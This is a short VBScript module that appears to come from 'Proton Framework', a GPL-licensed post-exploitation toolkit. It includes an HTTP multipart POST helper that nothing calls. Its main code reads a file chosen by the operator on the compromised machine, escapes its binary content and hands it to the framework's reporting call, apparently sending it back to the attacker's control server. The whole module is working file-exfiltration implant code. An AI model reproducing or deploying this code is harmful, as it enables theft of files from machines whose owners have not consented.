'            ---------------------------------------------------
'                             Proton Framework              
'            ---------------------------------------------------
'                Copyright (C) <2019-2020>  <Entynetproject>
'
'        This program is free software: you can redistribute it and/or modify
'        it under the terms of the GNU General Public License as published by
'        the Free Software Foundation, either version 3 of the License, or
'        any later version.
'
'        This program is distributed in the hope that it will be useful,
'        but WITHOUT ANY WARRANTY; without even the implied warranty of
'        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
'        GNU General Public License for more details.
'
'        You should have received a copy of the GNU General Public License
'        along with this program.  If not, see <http://www.gnu.org/licenses/>.

Function WinHTTPPostRequest(URL, FormData, Boundary)
  Dim http 'As New MSXML2.XMLHTTP

  'Create XMLHTTP/ServerXMLHTTP/WinHttprequest object
  'You can use any of these three objects.
  Set http = CreateObject("WinHttp.WinHttprequest.5.1")
  'Set http = CreateObject("MSXML2.XMLHTTP")
  'Set http = CreateObject("MSXML2.ServerXMLHTTP")

  'Open URL As POST request
  http.Open "POST", URL, False

  'Set Content-Type header
  http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" + Boundary

  'Send the form data To URL As POST binary request

  MsgBox Len(formdata)
  http.send FormData

  'Get a result of the script which has received upload
  WinHTTPPostRequest = http.responseText
End Function

path = KoGetPath("~RFILE~")
data = KoReadBinaryFile(path)

MsgBox len(data)
data = Replace(data, chr(92), "\\", 1, -1, 0)
data = Replace(data, chr(0), "\0", 1, -1, 0)
MsgBox len(data)

KoReportWork data
KoExit
